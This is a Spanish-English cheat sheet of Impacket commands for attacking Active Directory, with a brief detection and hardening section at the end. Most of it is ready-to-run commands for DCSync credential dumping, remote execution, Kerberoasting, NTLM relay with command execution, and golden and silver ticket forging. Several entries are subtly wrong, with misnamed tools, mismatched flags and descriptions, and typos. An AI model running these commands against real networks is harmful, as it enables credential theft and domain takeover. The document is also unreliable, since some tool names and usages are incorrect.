---
title: Impacket
phase: tools
platform: windows, linux
tags: [impacket, smb, kerberos, ldap, ad, python]
risk: critical
attack_tactic: TA0008
attack_technique: T1021
data_sources: [ntlm-relay, kerberos-traffic, smb-traffic]
last_review: 2026-05-25
---

# Impacket

### Objetivo

Librería Python para manipulación de protocolos de redWindows (SMB, Kerberos, MSRPC, NTLM) y herramientas asociadas para AD attacks.

### Key Tools

```bash
# Secrets Dump (DCSync)
python secretsdump.py domain/user:password@target

# SMBEXEC
python smbleg.py domain/user:password@target

# WMIEXEC
python wmiexec.py domain/user:password@target

# Kerberoasting
python GetUserSPNs.py domain.com/user:password -outputfile hashes.txt

# MSRPC local enum
python lookupsid.py domain/user:password@target
```

### NTLM Relay

```bash
# Setup relay
python ntlmrelayx.py -tf targets.txt -smb2support

# Relay to SMB and execute
python ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"

# Relay to LDAP and grant permissions
python ntlmrelayx.py -tf targets.txt -of ldap-realy.json -I
```

### Overpass the Hash

```bash
# convert NTLM hash to ticket
python ticketer.py -hashes :NTLMHASH domain/user@domain.com

# golden ticket
python ticketer.py -nthash KRBTGSHASH -domain domain.com -domain-sid SID user@domain.com

# silver ticket
python ticketer.py -nthash HASH -service target -domain-sid SID user@domain.com
```

### MSRPC Enumeration

```bash
# Enum users via MSRPC
python lookupsids.py domain/user:password@target

# Enum services via MSRPC
python rpcdump.py target@domain.com -k
```

### One-liners

```bash
# Dump SAM via SAMR protocol
python samrdump.py domain/user:password@target

# Grab MSSQL instances
python mssqlping.py target

# Get hostname from SMB
python smbserver.py -smb2support share target
```

### Detección y Mitigación

- **Visibilidad:** Security Event 4624 (logon types vary by tool), 4672 (admin privileges), Kerberos 4769 (TGS requests), NTLMrelay attack logging.
- **Hardening:** Enable SMB signing, LDAP signing + channel binding, no concurrent NTLM relays same session, Protected Users group.

### Validación de Cobertura

- **Prueba técnica:** secretsdump in lab, verify AD log entries.
- **Criterio de éxito:** SIEM alerts on DCSync; detect whenkrbtgt password last changed.
